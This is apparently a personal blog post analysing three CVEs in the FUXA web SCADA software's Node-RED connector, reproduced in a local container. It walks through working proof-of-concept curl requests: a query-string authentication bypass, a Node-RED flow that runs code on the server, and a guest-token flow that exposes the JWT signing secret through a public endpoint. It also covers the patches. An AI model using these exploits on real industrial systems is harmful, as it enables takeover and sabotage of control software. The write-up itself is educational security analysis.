---
layout: 'blog.njk'
title: Amateur Analysis of SCADA Software CVE
description: Analyzing three CVEs on SCADA software authentication with a 3rd party integration
tags: blog
date: 2026-11-23
---

# Amateur Analysis of SCADA Software CVE

I'm experimenting with something beyond my expertise. Exploring a totally new field which I have no prior knowledge about.
This time I'm reading about Common Vulnerabilities and Exposures (CVE) report in an open-source project I found in Github.
The project that I'm looking at is [FUXA](https://github.com/frangoteam/FUXA). A web-based SCADA (Supervisory Control and
Data Acquisition) software that allows us to build modern dashboards to monitor connected machines using standard protocols.

I'm interested in this project because I'm currently building my experience in ICS (Industrial Control System) security from
zero. This is intriguing since I finished reading [Countdown to Zero Day](https://www.goodreads.com/en/book/show/18465875-countdown-to-zero-day)
by Kim Zetter. It was a mind-blowing read, I didn't know how lines of code could be used to sabotage a nuclear-plant which had
full of heavy mechanics and not exposed to the internet. Since my background is full-stack web development and I learned a
little bit of embedded system during college, I started from the most familiar part about ICS: the web UI and
connector integration. I find FUXA as a suitable starting point for me to learn about SCADA software. Instead of following
tutorial, I'm learning by reading CVE reports. There are 3 CVEs which were related to each other and existed in a single file,
from missing authentication to a partial security fix, and finally to insufficient JWT validation.

## Reading CVE Report

The first CVE I was reading on was security bypass vulnerability using path manipulation ([CVE-2026-43945](https://www.cve.org/CVERecord?id=CVE-2026-43945)).
This could happen when we access a protected endpoint then manipulating the original path of the URL to bypass it. For this case,
it was endpoint to access [Node-RED](https://nodered.org/) feature to manipulate flows of a project. Node-RED is a low-code
development tool to build automation or industrial control system. My experience on this tool is very limited, I knew it since
one of my friend in the past used this to prototype his final project in college. However, the vulnerability here is not on
the Node-RED but the *connector*, the part which makes it possible for FUXA to integrate with Node-RED.

### Path Manipulation Vulnerability

FUXA has monolithic architecture, a client and a server run as a single process and accessed through a single port. Although the
code component is modular (client and server are different component), it is deployed as a single unit.

![Simplified FUXA client-server architecture](/images/analyzing-scada-software-cve/fuxa-client-server-architecture.png "Figure 1. Simplified Fuxa Client Server Architecture")

The architecture shown on Figure 1 is trimmed down version of FUXA application architecture. FUXA doesn't just support Node-RED
but also Siemens S7, and other standard industrial protocols. We're focusing on Node-RED since the CVE is related to this
connector.

Accessing the Node-RED feature can be done by calling `/nodered` path. Although there are several paths, we are focusing on crucial
one, which is `/nodered/flows`. The [endpoint](https://nodered.org/docs/api/admin/methods/post/flows/) `/nodered/flows` deploys
a flow configuration which may have function nodes that could execute arbitrary server-side JavaScript when triggered. We can
say *flow* the same as source code in programming but since Node-RED is a low-code visual programming tool, it is called '[flow](https://nodered.org/docs/user-guide/concepts)'.

So what happen in the CVE report is, while the path `/nodered/*` is already protected and requires a credential, it can still be
bypassed just by modifying the path. Say if we want to create or modify a flow, normally we send a POST request to `/nodered/flows`
with a body of flow configuration and a credential. Yet in this report, it can bypassed by modifying the path to `/nodered/flows?x=/socket.io`.

We can test this by pull the container image for version 1.2.11 from https://hub.docker.com/r/frangoteam/fuxa. We also need to
set the `secureEnabled` setting to `true`. This can be done by mounting volume `/usr/src/app/FUXA/server/_appdata` in container
to any directory where it has `settings.js` in our local directory. The configuration file should at least have this value:

```js
module.exports = {
    // Authentication and token signing.
    // secretCode signs JWTs: keep it long and random anywhere non-isolated.
    secureEnabled: true,
    secretCode: 'lab-only-secret',
    tokenExpiresIn: '1h',

    // Node-RED integration, auth required.
    nodeRedEnabled: true,
    nodeRedAuthMode: 'secure',
}
```

Another value we need to look at is `nodeRedEnabled` which enable Node-RED connector, otherwise the endpoint would not exist.
Once the container is running, we can call port 1881 to test it.

```
> curl -iX POST localhost:1881/nodered/flows
HTTP/1.1 401 Unauthorized
X-Powered-By: Express
Access-Control-Allow-Methods: GET,PUT,POST,DELETE,OPTIONS
Access-Control-Allow-Headers: x-access-token, x-auth-user, Origin, Content-Type, Accept
Content-Type: application/json; charset=utf-8
Content-Length: 67
ETag: W/"43-xavDh2CbibrgLEnD0WSI2j5gjl4"
Date: Tue, 24 Nov 2026 14:21:56 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"error":"unauthorized_error","message":"Authentication required!"}
```

The authentication works, it is rejecting with HTTP 401 when we are not passing credential. Now let's test the bypass method,
we are adding a query parameter `?x=/socket.io` at the end of the URL path.

```
> curl -iX POST localhost:1881/nodered/flows?x=/socket.io
HTTP/1.1 400 Bad Request
X-Powered-By: Express
Access-Control-Allow-Methods: GET,PUT,POST,DELETE,OPTIONS
Access-Control-Allow-Headers: x-access-token, x-auth-user, Origin, Content-Type, Accept
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Content-Length: 72
ETag: W/"48-GNgTwSgYngmuEUMiql32UdMZN34"
Date: Tue, 24 Nov 2026 14:38:43 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"code":"unexpected_error","message":"config.forEach is not a function"}
```

Well, look at that. We got HTTP 400 now, it doesn't complain about the authentication but missing payload. The exception error
gives us clue it was failing to iterate an array. Since this endpoint is used to set a flow, we are going to build one
through API. Let's try to create a flow that executes a code to write a new file. This file will be written in the server
machine where FUXA is running, in other words, in the container. So let's write it to `/tmp` directory as POC. Here's the
payload:

```json
[
    {
        "id": "tab-lab",
        "type": "tab",
        "label": "lab"
    },
    {
        "id": "inject-lab",
        "type": "inject",
        "z": "tab-lab",
        "once": true,
        "onceDelay": "0.1",
        "payload": "",
        "payloadType": "date",
        "x": 160,
        "y": 120,
        "wires": [
            [
                "function-proof"
            ]
        ]
    },
    {
        "id": "function-proof",
        "type": "function",
        "z": "tab-lab",
        "name": "write marker",
        "func": "const fs = global.get('fs');\nfs.writeFile('/tmp/fuxa-rce-proof.txt','FUXA labproof').then(() => node.warn('Marker written')).catch(err => node.error(err,msg));\nreturn msg;",
        "outputs": 0,
        "x": 360,
        "y": 120,
        "wires": []
    }
]
```

The flow is very minimal, one inject (timestamp) and one function node. It is just executing a function once the flow is
deployed and triggered by 'inject' after 0.1s delay on startup. Save it in a file **payload.json**, then send the payload in
the POST request. This is the response:

```
> curl -iX POST --json @leak.json localhost:1881/nodered/flows?x=/socket.io
HTTP/1.1 204 No Content
X-Powered-By: Express
Access-Control-Allow-Methods: GET,PUT,POST,DELETE,OPTIONS
Access-Control-Allow-Headers: x-access-token, x-auth-user, Origin, Content-Type, Accept
Access-Control-Allow-Origin: *
Date: Wed, 25 Nov 2026 04:21:47 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

Well, well, well. Looks like something just happened. Let's look at http://localhost:1881/flows to check the created flow.

![Flow created after the path-manipulation bypass](/images/analyzing-scada-software-cve/created-flow-after-path-manipulation.png "Figure 2. Created Flow After Bypassing Through Path Manipulation")

We can see the flow is created and the function does match with the payload we sent before. Let's see what's in the `/tmp` directory.

```
> podman exec fuxa ls /tmp; echo "FILE content: $(podman exec fuxa cat /tmp/fuxa-rce-proof.txt)"
fuxa-rce-proof.txt
scarf-js-history-root.log
FILE content: FUXA labproof
```

There it is, we just executed a code inside the server after bypassing the security by manipulating the path. This is the reported
vulnerability in [CVE-2026-43945](https://www.cve.org/CVERecord?id=CVE-2026-43945). This vulnerability is introduced by [PR #2182](https://github.com/frangoteam/FUXA/pull/2182)
which added authentication to `/nodered/*` endpoint but missed to properly handle `/dashboard` and `/socket.io` path. This
piece of code executed before the authentication happens,

```js
const url = req.originalUrl || req.url || req.path;
if (url.includes('/dashboard') || url.includes('/socket.io')) return next();
```

Since `req.originalUrl` is retaining the original URL, the path that was assume to be `/dashboard` and `/socket.io` as valid was
actually consider `/nodered/flows?x=/socket.io` to be valid also. When this match, the code skip the authentication part on
the next line and proceed to process the request. The solution is it shouldn't include the query parameter at all but only the
path, hence on [PR #2660](https://github.com/frangoteam/FUXA/pull/2260/files) it replaces it with `req.baseUrl`.

I wonder, how come this vulnerability exists? what was the change that introduced this? It turned out, if we look again at [PR #2182](https://github.com/frangoteam/FUXA/pull/2182)
and check the vulnerability report, that PR was created to patch another vulnerability, [CVE-2026-25938](https://www.cve.org/CVERecord?id=CVE-2026-25938).
The vulnerabity report is about unauthenticated `/nodered/*` endpoint which it protects `/nodered` endpoint but skip authentication for
several endpoints including `/nodered/flows`.

### When Convenience Beats Security

FUXA introduced Node-RED connector since release [v1.2.8](https://github.com/frangoteam/FUXA/releases/tag/v1.2.8). It was introduced
in [PR #1993](https://github.com/frangoteam/FUXA/pull/1993). This was already including authentication on `/nodered` endpoint.
However, since [PR #2072](https://github.com/frangoteam/FUXA/pull/2072) this authentication was modified to exclude several
endpoints, including `/nodered/flows`. Why? "*It fixes various bugs related to Node-Red embedding, auth, paths, fuxa-nodes,
and API access.*" that was stated in the summary.

Seems the authentication was thought to be a blocker so it was disabled for convenience, yet later it was considered as vulnerability (of course!)
and added in CVE report. Solving a bug by removing authentication is a bug. We can reproduce the vulnerability using the same step like we did on
path manipulation. Except this time we can omit `?x=/socket.io`. Just sending the payload to `/nodered/flows` and make it executes
arbitrary code.

### A Guest Coming From Backdoor

After we learn how the vulnerability exists in the first place, what happen after those 2 CVEs we discussed already patched?
Another CVE report coming, [CVE-2026-67443](https://www.cve.org/CVERecord?id=CVE-2026-67443). This time it's not about the
endpoint but the credential itself, especially how it was validated by the server.

Accessing protected endpoint requires a [JWT](https://www.jwt.io/introduction#what-is-json-web-token), this token can be passed
on `x-access-token` header or `?token=` query parameter. The payload looks like [this](https://github.com/frangoteam/FUXA/blob/5066a1a8117849c5e376cf640cd8b040cd9c9466/server/api/jwt-helper.js#L105-L116)

```json
{
    "id": "user_id", //can be any user ID
    "groups": [] //[-1] for admin, and ["guest"] for guest
}
```

Let's focus on `groups`, FUXA has admin group which has value -1 or 255, and guest group that has value 'guest'.
Guest is basically read-only mode, getting a 'guest' token is done by simply sending POST request to `/api/heartbeat`.
So anyone can get it. While admin group has full access, including `/nodered/*` endpoint. It requires a login to get it.
Both groups are signed using the same secret code. The question is, does the server know which group is accessing `/nodered/*`
endpoint?

When PR #2660 was merged to protect `/nodered/*` endpoint, it reused function to verify the JWT signature as a way to check
whether a request is allowed or not. However, since both admin and guest JWT were signed using the same secret code, both had
the same valid signature. In other words, any valid JWT can be used to access `/nodered/*` endpoint regardless of the groups.
This is what [CVE-2026-67443](https://www.cve.org/CVERecord?id=CVE-2026-67443) is all about.

![](/images/analyzing-scada-software-cve/fuxa-authentication-flow.png "Figure 3. FUXA Node-RED Endpoint Authentication Flow")

On Figure 3 we can see how the authentication flow works, it only checks whether the JWT signature is valid. Let's try getting
the guest token first, make sure we test it on image `docker.io/frangoteam/fuxa:1.3.2`

```
> curl -iX POST localhost:1881/api/heartbeat
HTTP/1.1 200 OK
X-Powered-By: Express
Access-Control-Allow-Methods: GET,PUT,POST,DELETE,OPTIONS
Access-Control-Allow-Headers: x-access-token, x-auth-user, Origin, Content-Type, Accept, Skip-Auth, Skip-Error
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 99
Date: Thu, 26 Nov 2026 07:27:46 GMT
X-RateLimit-Reset: 1795678193
Content-Type: application/json; charset=utf-8
Content-Length: 201
ETag: W/"c9-rTedMd3wY6J9lVjvQFBK6n0H/eM"
Connection: keep-alive
Keep-Alive: timeout=5

{"message":"guest","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Imd1ZXN0IiwiZ3JvdXBzIjpbImd1ZXN0Il0sImlhdCI6MTc5NTY3ODA2NiwiZXhwIjoxNzk1NjgxNjY2fQ.G8ziBvtqcKmoBm7-ajzvuZHI2FI1T3XVyE9O9rK6L24"}
```

If we decode the `token` we will get the following payload,

```json
{
  "id": "guest",
  "groups": [
    "guest"
  ],
  "iat": 1795678066,
  "exp": 1795681666
}
```

Now the next step is we are going to use this to call `/nodered/flows` just like before, let's test it without payload.

```
> curl -iX POST 
    -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Imd1ZXN0IiwiZ3JvdXBzIjpbImd1ZXN0Il0sImlhdCI6MTc5NTY3ODA2NiwiZXhwIjoxNzk1NjgxNjY2fQ.G8ziBvtqcKmoBm7-ajzvuZHI2FI1T3XVyE9O9rK6L24' 
    localhost:1881/nodered/flows

HTTP/1.1 400 Bad Request
X-Powered-By: Express
Access-Control-Allow-Methods: GET,PUT,POST,DELETE,OPTIONS
Access-Control-Allow-Headers: x-access-token, x-auth-user, Origin, Content-Type, Accept, Skip-Auth, Skip-Error
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Content-Length: 72
ETag: W/"48-GNgTwSgYngmuEUMiql32UdMZN34"
Date: Thu, 26 Nov 2026 07:32:50 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"code":"unexpected_error","message":"config.forEach is not a function"}
```

Looks good, we got HTTP 400 instead of HTTP 401. Next is we are going to craft a payload. This time we are not just executing a code
to write a new file but we are adding a new endpoint to retrieve credentials from the server. Here is the payload

```json
[
  {
    "id": "tab-leak",
    "type": "tab",
    "label": "leak"
  },
  {
    "id": "in",
    "type": "http in",
    "z": "tab-leak",
    "url": "/leak",
    "method": "get",
    "x": 140,
    "y": 120,
    "wires": [
      [
        "fn"
      ]
    ]
  },
  {
    "id": "fn",
    "type": "function",
    "z": "tab-leak",
    "name": "leak runtime",
    "func": "const rt = global.get('fuxa').runtime;\nmsg.payload = {\n  secretCode: rt.settings.secretCode,\n  tokenExpiresIn: rt.settings.tokenExpiresIn,\n  devices: rt.project.getDevices()\n};\nreturn msg;",
    "outputs": 1,
    "x": 360,
    "y": 120,
    "wires": [
      [
        "out"
      ]
    ]
  },
  {
    "id": "out",
    "type": "http response",
    "z": "tab-leak",
    "x": 580,
    "y": 120,
    "wires": []
  }
]
```

What happen in the payload here is, we are adding a new entrypoint with `http in` to trigger a function. The entrypoint is
located at `/leak` but in this case, FUXA will route it to `/dashboard/leak` which is a public endpoint. The function here
will return a JSON payload that consist information like `secretCode` which is used to sign a JWT, `tokenExpiresIn` to tell
how long the token expire and `devices` which list the configuration of connected devices. We send this payload to create a
flow in Node-RED. Here is the response,

```
> curl -iX POST
        -H 'X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Imd1ZXN0IiwiZ3JvdXBzIjpbImd1ZXN0Il0sImlhdCI6MTc5NTY3ODA2NiwiZXhwIjoxNzk1NjgxNjY2fQ.G8ziBvtqcKmoBm7-ajzvuZHI2FI1T3XVyE9O9rK6L24' 
        --json @payload.json
        localhost:1881/nodered/flows

HTTP/1.1 204 No Content
X-Powered-By: Express
Access-Control-Allow-Methods: GET,PUT,POST,DELETE,OPTIONS
Access-Control-Allow-Headers: x-access-token, x-auth-user, Origin, Content-Type, Accept, Skip-Auth, Skip-Error
Access-Control-Allow-Origin: *
Date: Thu, 26 Nov 2026 07:50:18 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

There is no error, although we are using guest token it is accepting the payload. Now let's try call `/dashboard/leak`

```
> curl localhost:1881/dashboard/leak | python -m json -m json.tool

{
    "secretCode": "lab-only-secret",
    "tokenExpiresIn": "1h",
    "devices": {}
}
```

There you go, we manage to steal the `secretCode` which is used by the server to sign a JWT. The `devices` here is empty
since I don't connect to any devices. We can do many things with this vulnerability from RCE to create a webshell, this is
why adding proper protection is necessary to this endpoint.

This vulnerability is patched on [PR #2393](https://github.com/frangoteam/FUXA/pull/2393), it added validation by decoding
the JWT and check if the group payload is 'guest' or 'admin'. It will return HTTP 403 if the group is 'guest'. This sounds a bit
odd since any group other than guest can access this endpoint. Apparently after sometime, another [commit](https://github.com/frangoteam/FUXA/commit/315ef2300b1a5c956251508f6953e9e2e1a98831)
improved it by checking if the group is `admin` and return HTTP 403 if not. Figure below is the new refined authentication flow

![](/images/analyzing-scada-software-cve/fuxa-refined-authentication-flow.png "Figure 4. Improved FUXA Node-RED Endpoint Authentication Flow")

This should be enough to protect the Node-RED endpoint.

## Lessons

After reading all 3 CVEs, I wonder if these CVEs can be prevented from
the begininng since the time it was discovered was quite long. This is the chronological order of the CVE:

- [CVE-2026-25938](https://www.cve.org/CVERecord?id=CVE-2026-25938) (February 9 2026)
- [CVE-2026-43945](https://www.cve.org/CVERecord?id=CVE-2026-43945) (July 21 2026)
- [CVE-2026-67443](https://www.cve.org/CVERecord?id=CVE-2026-67443) (August 18 2026)

From release v1.2.8, I'm wondering if the problem here was because of time, since there was a PR that disabled authentication as
a way to fix a bug and the maintainer just accepted it. It could be because the maintainer was not using Node-RED so he trusted
the contributor judgement. The partial fix in a PR also showed a lack of systemic review and familiarity with the whole
system, at least the authentication flow.

What if, all of this problem can be solved with a tool that could understand the project and the codebase, then points out the
potential problem in pull request? I believe in 2026 that tool already exists and capable enough. My last team was using
coding agent to review every PR and it could catch subtle bug and logical error. That saved us a lot of time instead of waiting
for other teammate, who may be exhausted, to give feedback and approve.

The bigger challenge here is maintaining connector since the maintainer needs to be familiar and ensure the connector implementation
is secure enough or they can delegate a person who is familiar with the domain to maintain the connector. Otherwise it could end up
like the CVE we read, exposing a sensitive endpoint to public and cause a security concern.
